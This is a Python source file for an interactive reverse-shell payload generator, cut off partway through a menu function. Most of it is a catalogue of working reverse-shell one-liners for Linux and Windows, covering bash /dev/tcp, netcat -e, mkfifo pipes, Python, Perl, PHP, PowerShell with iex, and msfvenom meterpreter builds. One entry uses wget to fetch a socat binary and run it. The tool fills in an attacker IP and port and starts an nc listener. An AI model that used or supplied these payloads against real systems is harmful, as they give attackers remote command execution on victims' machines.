#!/usr/bin/env python3
import socket
import subprocess
import sys
import os
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
import json
import ipaddress
from typing import List, Dict, Tuple, Optional

class Colors:
    """ANSI color codes for fancy output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class RevShellGenerator:
    def __init__(self):
        self.local_ip, self.public_ip = self.get_ip_addresses()
        self.ip = None  
        self.port = None  
        self.ip_type = None  
        self.shells = {
            'linux': [
                {
                    'name': 'Bash TCP #1',
                    'lang': 'bash',
                    'payload': 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
                },
                {
                    'name': 'Bash TCP #2',
                    'lang': 'bash',
                    'payload': '0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196'
                },
                {
                    'name': 'Bash TCP #3',
                    'lang': 'bash',
                    'payload': '/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1'
                },
                {
                    'name': 'Bash UDP',
                    'lang': 'bash',
                    'payload': 'sh -i >& /dev/udp/{ip}/{port} 0>&1'
                },
                {
                    'name': 'Zsh TCP #1',
                    'lang': 'zsh',
                    'payload': 'zsh -c \'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''
                },
                {
                    'name': 'Zsh TCP #2',
                    'lang': 'zsh',
                    'payload': 'zsh -i >& /dev/tcp/{ip}/{port} 0>&1'
                },
                {
                    'name': 'Zsh UDP',
                    'lang': 'zsh',
                    'payload': 'zsh -i >& /dev/udp/{ip}/{port} 0>&1'
                },
                {
                    'name': 'Socat #1',
                    'lang': 'bash',
                    'payload': '/tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}'
                },
                {
                    'name': 'Socat #2 (with download)',
                    'lang': 'bash',
                    'payload': 'wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}'
                },
                {
                    'name': 'Perl #1',
                    'lang': 'perl',
                    'payload': 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
                },
                {
                    'name': 'Perl #2',
                    'lang': 'perl',
                    'payload': 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
                },
                {
                    'name': 'Python #1 (with pty)',
                    'lang': 'python',
                    'payload': 'export RHOST="{ip}";export RPORT={port};python -c \'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\''
                },
                {
                    'name': 'Python #2 (with pty)',
                    'lang': 'python',
                    'payload': 'python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
                },
                {
                    'name': 'Python #3 (subprocess)',
                    'lang': 'python',
                    'payload': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''
                },
                {
                    'name': 'Python #4 (subprocess stdin)',
                    'lang': 'python',
                    'payload': 'python -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\''
                },
                {
                    'name': 'Python No Spaces #1',
                    'lang': 'python',
                    'payload': 'python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
                },
                {
                    'name': 'Python Shortest #1',
                    'lang': 'python',
                    'payload': 'python -c \'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("{ip}",{port}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\''
                },
                {
                    'name': 'PHP #1 (exec)',
                    'lang': 'php',
                    'payload': 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''
                },
                {
                    'name': 'PHP #2 (shell_exec)',
                    'lang': 'php',
                    'payload': 'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");\''
                },
                {
                    'name': 'PHP #3 (system)',
                    'lang': 'php',
                    'payload': 'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");\''
                },
                {
                    'name': 'Ruby #1',
                    'lang': 'ruby',
                    'payload': 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
                },
                {
                    'name': 'Netcat Traditional #1',
                    'lang': 'bash',
                    'payload': 'nc -e /bin/sh {ip} {port}'
                },
                {
                    'name': 'Netcat Traditional #2',
                    'lang': 'bash',
                    'payload': 'nc -e /bin/bash {ip} {port}'
                },
                {
                    'name': 'Netcat OpenBsd',
                    'lang': 'bash',
                    'payload': 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'
                },
                {
                    'name': 'Netcat BusyBox',
                    'lang': 'bash',
                    'payload': 'rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'
                },
                {
                    'name': 'Ncat',
                    'lang': 'bash',
                    'payload': 'ncat {ip} {port} -e /bin/bash'
                },
                {
                    'name': 'OpenSSL',
                    'lang': 'bash',
                    'payload': 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s'
                },
                {
                    'name': 'Awk',
                    'lang': 'awk',
                    'payload': 'awk \'BEGIN {{{{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{{{ do{{{{ printf "shell>" |& s; s |& getline c; if(c){{{{ while ((c |& getline) > 0) print $0 |& s; close(c); }}}} }}}} while(c != "exit") close(s); }}}}}}}}\' /dev/null'
                },
                {
                    'name': 'Lua Linux',
                    'lang': 'lua',
                    'payload': 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{ip}\',\'{port}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"'
                },
                {
                    'name': 'NodeJS #1',
                    'lang': 'nodejs',
                    'payload': '(function(){{{{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({port}, "{ip}", function(){{{{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}}}});return /a/;}}}})();'
                },
                {
                    'name': 'Golang',
                    'lang': 'go',
                    'payload': 'echo \'package main;import"os/exec";import"net";func main(){{{{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}}}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'
                },
                {
                    'name': 'msfvenom Linux Staged',
                    'lang': 'msfvenom',
                    'payload': 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf'
                },
                {
                    'name': 'msfvenom Linux Stageless',
                    'lang': 'msfvenom',
                    'payload': 'msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf'
                },
            ],
            'windows': [
                {
                    'name': 'PowerShell #1',
                    'lang': 'powershell',
                    'payload': 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{{{0}}}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}}};$client.Close()'
                },
                {
                    'name': 'PowerShell #2',
                    'lang': 'powershell',
                    'payload': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{{{0}}}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}}};$client.Close()"'
                },
                {
                    'name': 'Python Windows',
                    'lang': 'python',
                    'payload': 'python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{ip}\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'cmd.exe\'])"'
                },
                {
                    'name': 'Netcat Windows',
                    'lang': 'cmd',
                    'payload': 'nc.exe -e cmd.exe {ip} {port}'
                },
                {
                    'name': 'Ruby Windows',
                    'lang': 'ruby',
                    'payload': 'ruby -rsocket -e \'c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
                },
                {
                    'name': 'msfvenom Windows Staged',
                    'lang': 'msfvenom',
                    'payload': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe'
                },
                {
                    'name': 'msfvenom Windows Stageless',
                    'lang': 'msfvenom',
                    'payload': 'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe'
                },
            ],
        }

    def get_public_ipv4(self) -> Tuple[Optional[str], str]:
        services = [
            ("https://api.ipify.org?format=json", "json", "ip"),
            ("https://api.ipify.org", "text", None),
            ("https://ifconfig.me/ip", "text", None),
            ("https://icanhazip.com", "text", None),
            ("https://ipinfo.io/ip", "text", None),
            ("https://api.my-ip.io/ip", "text", None),
        ]
        
        def is_valid_ipv4(ip_str: str) -> bool:
            """Validate IPv4 address (not IPv6)"""
            try:
                addr = ipaddress.ip_address(ip_str.strip())
                return addr.version == 4 and not addr.is_private
            except ValueError:
                return False
        

        for url, resp_type, json_key in services:
            try:
                req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with urlopen(req, timeout=4) as response:
                    data = response.read().decode('utf-8').strip()
                    
                    if resp_type == "json":
                        try:
                            ip = json.loads(data).get(json_key, "")
                        except json.JSONDecodeError:
                            continue
                    else:  
                        ip = data.split('\n')[0].strip()
                    
                    if is_valid_ipv4(ip):
                        return ip, f"urllib: {url.split('/')[2]}"
            except (URLError, HTTPError, TimeoutError, Exception):
                continue
        for url, resp_type, json_key in services:
            try:
                result = subprocess.run(
                    ['curl', '-s', '--max-time', '5', url],
                    capture_output=True,
                    text=True,
                    timeout=6
                )
                
                if result.returncode == 0:
                    data = result.stdout.strip()
                    
                    if resp_type == "json":
                        try:
                            ip = json.loads(data).get(json_key, "")
                        except json.JSONDecodeError:
                            continue
                    else:  
                        ip = data.split('\n')[0].strip()
                    
                    if is_valid_ipv4(ip):
                        return ip, f"curl: {url.split('/')[2]}"
            except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
                continue
        
        return None, "All services unreachable or returned invalid IPv4"

    def get_ip_addresses(self) -> Tuple[str, str]:
        """Get both local and public IP addresses"""
        local_ip = "127.0.0.1"
        public_ip = "unknown"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Could not determine local IP: {e}{Colors.ENDC}")
        public_ipv4, status = self.get_public_ipv4()
        
        if public_ipv4:
            public_ip = public_ipv4
            print(f"{Colors.GREEN}[+] Public IP detected via {status}{Colors.ENDC}")
        else:
            public_ip = local_ip  
            print(f"{Colors.YELLOW}[!] Public IP detection failed: {status}. Using local IP as fallback.{Colors.ENDC}")
        
        return local_ip, public_ip

    def validate_ip(self, ip: str) -> bool:
        """Validate IP address format"""
        try:
            socket.inet_aton(ip)
            return True
        except:
            return False

    def validate_port(self, port: int) -> bool:
        """Validate port number"""
        return 1 <= port <= 65535

    def get_payloads(self, os_type: str, language: str = None, limit: int = None) -> List[Dict]:
        """Get payloads based on criteria"""
        if os_type not in self.shells:
            return []
        
        payloads = self.shells[os_type]
        
        if language:
            payloads = [p for p in payloads if p['lang'].lower() == language.lower()]
        
        formatted = []
        for payload in (payloads[:limit] if limit else payloads):
            formatted.append({
                'name': payload['name'],
                'lang': payload['lang'],
                'payload': payload['payload'].format(ip=self.ip, port=self.port)
            })
        
        return formatted

    def start_listener(self):
        """Start netcat listener"""
        print(f"\n{Colors.CYAN}[*] Starting listener on port {self.port}...{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] Waiting for connection...{Colors.ENDC}\n")
        try:
            subprocess.run(['nc', '-lvnp', str(self.port)])
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Listener stopped{Colors.ENDC}")
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Error: netcat (nc) not found. Please install netcat.{Colors.ENDC}")
            print(f"{Colors.CYAN}[*] Listener command: nc -lvnp {self.port}{Colors.ENDC}")

    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name != 'nt' else 'cls')

    def display_banner(self):
        """Display tool banner"""
        banner = f"""{Colors.CYAN}
██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗     ██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║     ██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║     ██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝
██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║     ██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗
██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
{Colors.ENDC}{Colors.YELLOW}                                        By Neil Duge{Colors.ENDC}
        """
        print(banner)

    def display_config(self):
        """Display current configuration in a fancy box"""
        print(f"\n{Colors.BOLD}╔{'═'*78}╗{Colors.ENDC}")
        print(f"{Colors.BOLD}║{Colors.ENDC}{Colors.GREEN}  CURRENT CONFIGURATION{' '*55}{Colors.ENDC}{Colors.BOLD}║{Colors.ENDC}")
        print(f"{Colors.BOLD}╠{'═'*78}╣{Colors.ENDC}")
        print(f"{Colors.BOLD}║{Colors.ENDC}  {Colors.CYAN}Local IP:{Colors.ENDC}  {self.local_ip:<65}{Colors.BOLD}║{Colors.ENDC}")
        print(f"{Colors.BOLD}║{Colors.ENDC}  {Colors.CYAN}Public IP:{Colors.ENDC} {self.public_ip:<65}{Colors.BOLD}║{Colors.ENDC}")
        
        if self.ip:
            ip_display = f"{self.ip} ({self.ip_type})"
            print(f"{Colors.BOLD}║{Colors.ENDC}  {Colors.GREEN}{Colors.BOLD}Active IP:{Colors.ENDC} {ip_display:<65}{Colors.BOLD}║{Colors.ENDC}")
        else:
            print(f"{Colors.BOLD}║{Colors.ENDC}  {Colors.YELLOW}Active IP:{Colors.ENDC} {'NOT SET':<65}{Colors.BOLD}║{Colors.ENDC}")
            
        if self.port:
            print(f"{Colors.BOLD}║{Colors.ENDC}  {Colors.GREEN}{Colors.BOLD}Port:{Colors.ENDC}      {str(self.port):<65}{Colors.BOLD}║{Colors.ENDC}")
        else:
            print(f"{Colors.BOLD}║{Colors.ENDC}  {Colors.YELLOW}Port:{Colors.ENDC}      {'NOT SET':<65}{Colors.BOLD}║{Colors.ENDC}")
            
        print(f"{Colors.BOLD}╚{'═'*78}╝{Colors.ENDC}")

    def display_payloads(self, payloads: List[Dict]):
        """Display formatted payloads"""
        print(f"\n{Colors.BOLD}{'='*80}{Colors.ENDC}")
        for idx, payload in enumerate(payloads, 1):
            print(f"\n{Colors.GREEN}{Colors.BOLD}[{idx}] {payload['name']} {Colors.CYAN}({payload['lang']}){Colors.ENDC}")
            print(f"{Colors.BOLD}{'-' * 80}{Colors.ENDC}")
            print(f"{Colors.YELLOW}{payload['payload']}{Colors.ENDC}")
            print(f"{Colors.BOLD}{'-' * 80}{Colors.ENDC}")

    def get_languages(self, os_type: str) -> List[str]:
        """Get available languages for an OS"""
        if os_type not in self.shells:
            return []
        return sorted(list(set([s['lang'] for s in self.shells[os_type]])))

    def initial_setup(self):
        """Initial IP and Port setup"""
        self.clear_screen()
        self.display_banner()
        
        print(f"\n{Colors.BOLD}╔{'═'*78}╗{Colors.ENDC}")
        print(f"{Colors.BOLD}║{Colors.ENDC}{Colors.YELLOW}  INITIAL CONFIGURATION{' '*56}{Colors.ENDC}{Colors.BOLD}║{Colors.ENDC}")
        print(f"{Colors.BOLD}╚{'═'*78}╝{Colors.ENDC}")
        
        # IP Selection
        print(f"\n{Colors.CYAN}{Colors.BOLD}[*] IP ADDRESS SELECTION{Colors.ENDC}")
        print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
        print(f"  {Colors.GREEN}[1]{Colors.ENDC} Use Local IP:  {Colors.YELLOW}{self.local_ip}{Colors.ENDC}")
        print(f"  {Colors.GREEN}[2]{Colors.ENDC} Use Public IP: {Colors.YELLOW}{self.public_ip}{Colors.ENDC}")
        print(f"  {Colors.GREEN}[3]{Colors.ENDC} Enter Custom IP")
        print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
        
        while True:
            choice = input(f"\n{Colors.CYAN}Select IP option (1-3):{Colors.ENDC} ").strip()
            
            if choice == '1':
                self.ip = self.local_ip
                self.ip_type = "Local"
                print(f"{Colors.GREEN}[+] IP set to Local: {self.ip}{Colors.ENDC}")
                break
            elif choice == '2':
                self.ip = self.public_ip
                self.ip_type = "Public"
                print(f"{Colors.GREEN}[+] IP set to Public: {self.ip}{Colors.ENDC}")
                break
            elif choice == '3':
                custom_ip = input(f"{Colors.CYAN}Enter custom IP address:{Colors.ENDC} ").strip()
                if self.validate_ip(custom_ip):
                    self.ip = custom_ip
                    self.ip_type = "Custom"
                    print(f"{Colors.GREEN}[+] IP set to Custom: {self.ip}{Colors.ENDC}")
                    break
                else:
                    print(f"{Colors.RED}[!] Invalid IP address format. Try again.{Colors.ENDC}")
            else:
                print(f"{Colors.RED}[!] Invalid option. Please select 1, 2, or 3.{Colors.ENDC}")
        
        # Port Selection
        print(f"\n{Colors.CYAN}{Colors.BOLD}[*] PORT SELECTION{Colors.ENDC}")
        print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
        print(f"  {Colors.GREEN}[1]{Colors.ENDC} Use port 4444 (default)")
        print(f"  {Colors.GREEN}[2]{Colors.ENDC} Use port 1337")
        print(f"  {Colors.GREEN}[3]{Colors.ENDC} Use port 9001")
        print(f"  {Colors.GREEN}[4]{Colors.ENDC} Enter custom port")
        print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
        
        while True:
            choice = input(f"\n{Colors.CYAN}Select port option (1-4):{Colors.ENDC} ").strip()
            
            if choice == '1':
                self.port = 4444
                print(f"{Colors.GREEN}[+] Port set to: {self.port}{Colors.ENDC}")
                break
            elif choice == '2':
                self.port = 1337
                print(f"{Colors.GREEN}[+] Port set to: {self.port}{Colors.ENDC}")
                break
            elif choice == '3':
                self.port = 9001
                print(f"{Colors.GREEN}[+] Port set to: {self.port}{Colors.ENDC}")
            
            elif choice == '4':
                custom_port = input(f"{Colors.CYAN}Enter custom port (1-65535):{Colors.ENDC} ").strip()
                if custom_port.isdigit():
                    port_num = int(custom_port)
                    if self.validate_port(port_num):
                        self.port = port_num
                        print(f"{Colors.GREEN}[+] Port set to: {self.port}{Colors.ENDC}")
                        break
                    else:
                        print(f"{Colors.RED}[!] Port must be between 1 and 65535. Try again.{Colors.ENDC}")
                else:
                    print(f"{Colors.RED}[!] Invalid port number. Try again.{Colors.ENDC}")
            else:
                print(f"{Colors.RED}[!] Invalid option. Please select 1, 2, 3, or 4.{Colors.ENDC}")
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] Configuration complete!{Colors.ENDC}")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")

    def language_submenu(self, os_type: str, language: str):
        """Dedicated submenu for a specific language"""
        while True:
            self.clear_screen()
            self.display_banner()
            self.display_config()
            
            print(f"\n{Colors.BOLD}╔{'═'*78}╗{Colors.ENDC}")
            print(f"{Colors.BOLD}║{Colors.ENDC}{Colors.CYAN}  {language.upper()} SHELLS - {os_type.upper()}{' '*50}{Colors.ENDC}{Colors.BOLD}║{Colors.ENDC}")
            print(f"{Colors.BOLD}╚{'═'*78}╝{Colors.ENDC}")
            print(f"  {Colors.GREEN}[1]{Colors.ENDC} Show All {language.capitalize()} Shells")
            print(f"  {Colors.GREEN}[2]{Colors.ENDC} Show Top 5 {language.capitalize()} Shells")
            print(f"  {Colors.GREEN}[3]{Colors.ENDC} Generate & Start Listener")
            print(f"  {Colors.GREEN}[4]{Colors.ENDC} Back to {os_type.capitalize()} Menu")
            print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
            
            choice = input(f"\n{Colors.CYAN}Select option:{Colors.ENDC} ").strip()
            
            if choice == '1':
                payloads = self.get_payloads(os_type, language=language)
                self.display_payloads(payloads)
                print(f"\n{Colors.CYAN}[*] Listener Command: {Colors.YELLOW}nc -lvnp {self.port}{Colors.ENDC}")
                input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
                
            elif choice == '2':
                payloads = self.get_payloads(os_type, language=language, limit=5)
                self.display_payloads(payloads)
                print(f"\n{Colors.CYAN}[*] Listener Command: {Colors.YELLOW}nc -lvnp {self.port}{Colors.ENDC}")
                input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
                
            elif choice == '3':
                payloads = self.get_payloads(os_type, language=language)
                self.display_payloads(payloads)
                print(f"\n{Colors.CYAN}[*] Listener Command: {Colors.YELLOW}nc -lvnp {self.port}{Colors.ENDC}")
                
                confirm = input(f"\n{Colors.YELLOW}Start listener now? (y/n):{Colors.ENDC} ").strip().lower()
                if confirm == 'y':
                    self.start_listener()
                input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
                
            elif choice == '4':
                break
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.ENDC}")
                input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")

    def submenu(self, os_type: str):
        """Submenu for OS-specific options"""
        while True:
            self.clear_screen()
            self.display_banner()
            self.display_config()
            
            print(f"\n{Colors.BOLD}╔{'═'*78}╗{Colors.ENDC}")
            print(f"{Colors.BOLD}║{Colors.ENDC}{Colors.CYAN}  {os_type.upper()} SHELLS MENU{' '*61}{Colors.ENDC}{Colors.BOLD}║{Colors.ENDC}")
            print(f"{Colors.BOLD}╚{'═'*78}╝{Colors.ENDC}")
            print(f"  {Colors.GREEN}[1]{Colors.ENDC} Show All Shells (Top 5)")
            print(f"  {Colors.GREEN}[2]{Colors.ENDC} Browse by Language")
            print(f"  {Colors.GREEN}[3]{Colors.ENDC} Show All Available Shells")
            print(f"  {Colors.GREEN}[4]{Colors.ENDC} Generate Shells & Start Listener")
            if os_type == 'linux':
                print(f"\n{Colors.CYAN}  Quick Access Languages:{Colors.ENDC}")
                print(f"  {Colors.GREEN}[b]{Colors.ENDC} Bash menu")
                print(f"  {Colors.GREEN}[p]{Colors.ENDC} Python menu")
                print(f"  {Colors.GREEN}[z]{Colors.ENDC} Zsh menu")
                print(f"  {Colors.GREEN}[n]{Colors.ENDC} Netcat menu")
                print(f"  {Colors.GREEN}[h]{Colors.ENDC} PHP menu")
                print(f"  {Colors.GREEN}[r]{Colors.ENDC} Ruby menu")
            elif os_type == 'windows':
                print(f"\n{Colors.CYAN}  Quick Access Languages:{Colors.ENDC}")
                print(f"  {Colors.GREEN}[p]{Colors.ENDC} PowerShell menu")
                print(f"  {Colors.GREEN}[y]{Colors.ENDC} Python menu")
                print(f"  {Colors.GREEN}[r]{Colors.ENDC} Ruby menu")
            
            print(f"\n  {Colors.GREEN}[5]{Colors.ENDC} Back to Main Menu")
            print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
            
            choice = input(f"\n{Colors.CYAN}Select option:{Colors.ENDC} ").strip()
            
            if choice == '1':
                payloads = self.get_payloads(os_type, limit=5)
                self.display_payloads(payloads)
                print(f"\n{Colors.CYAN}[*] Listener Command: {Colors.YELLOW}nc -lvnp {self.port}{Colors.ENDC}")
                input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
                
            elif choice == '2':
                languages = self.get_languages(os_type)
                print(f"\n{Colors.BOLD}╔{'═'*78}╗{Colors.ENDC}")
                print(f"{Colors.BOLD}║{Colors.ENDC}{Colors.CYAN}  AVAILABLE LANGUAGES{' '*58}{Colors.ENDC}{Colors.BOLD}║{Colors.ENDC}")
                print(f"{Colors.BOLD}╚{'═'*78}╝{Colors.ENDC}")
                for idx, lang in enumerate(languages, 1):
                    print(f"  {Colors.GREEN}[{idx}]{Colors.ENDC} {lang.capitalize()}")
                print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
                
                lang_choice = input(f"\n{Colors.CYAN}Select language number:{Colors.ENDC} ").strip()
                if lang_choice.isdigit() and 1 <= int(lang_choice) <= len(languages):
                    selected_lang = languages[int(lang_choice) - 1]
                    self.language_submenu(os_type, selected_lang)
                else:
                    print(f"{Colors.RED}[!] Invalid selection{Colors.ENDC}")
                    input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
                
            elif choice == '3':
                payloads = self.get_payloads(os_type, limit=100)
                self.display_payloads(payloads)
                print(f"\n{Colors.CYAN}[*] Listener Command: {Colors.YELLOW}nc -lvnp {self.port}{Colors.ENDC}")
                input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
                
            elif choice == '4':
                payloads = self.get_payloads(os_type, limit=5)
                self.display_payloads(payloads)
                print(f"\n{Colors.CYAN}[*] Listener Command: {Colors.YELLOW}nc -lvnp {self.port}{Colors.ENDC}")
                
                confirm = input(f"\n{Colors.YELLOW}Start listener now? (y/n):{Colors.ENDC} ").strip().lower()
                if confirm == 'y':
                    self.start_listener()
                input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
            
            # Quick access options for Linux
            elif choice.lower() == 'b' and os_type == 'linux':
                self.language_submenu(os_type, 'bash')
                
            elif choice.lower() == 'p' and os_type == 'linux':
                self.language_submenu(os_type, 'python')
                
            elif choice.lower() == 'z' and os_type == 'linux':
                self.language_submenu(os_type, 'zsh')
                
            elif choice.lower() == 'h' and os_type == 'linux':
                self.language_submenu(os_type, 'php')
                
            elif choice.lower() == 'r' and os_type == 'linux':
                self.language_submenu(os_type, 'ruby')
                
            elif choice.lower() == 'n' and os_type == 'linux':
                # Special handling for netcat (filter by name, not language)
                all_payloads = self.get_payloads(os_type)
                nc_payloads = [p for p in all_payloads if 'netcat' in p['name'].lower() or 'ncat' in p['name'].lower()]
                
                while True:
                    self.clear_screen()
                    self.display_banner()
                    self.display_config()
                    
                    print(f"\n{Colors.BOLD}╔{'═'*78}╗{Colors.ENDC}")
                    print(f"{Colors.BOLD}║{Colors.ENDC}{Colors.CYAN}  NETCAT SHELLS - LINUX{' '*56}{Colors.ENDC}{Colors.BOLD}║{Colors.ENDC}")
                    print(f"{Colors.BOLD}╚{'═'*78}╝{Colors.ENDC}")
                    print(f"  {Colors.GREEN}[1]{Colors.ENDC} Show All Netcat Shells")
                    print(f"  {Colors.GREEN}[2]{Colors.ENDC} Generate & Start Listener")
                    print(f"  {Colors.GREEN}[3]{Colors.ENDC} Back to Linux Menu")
                    print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
                    
                    nc_choice = input(f"\n{Colors.CYAN}Select option:{Colors.ENDC} ").strip()
                    
                    if nc_choice == '1':
                        self.display_payloads(nc_payloads)
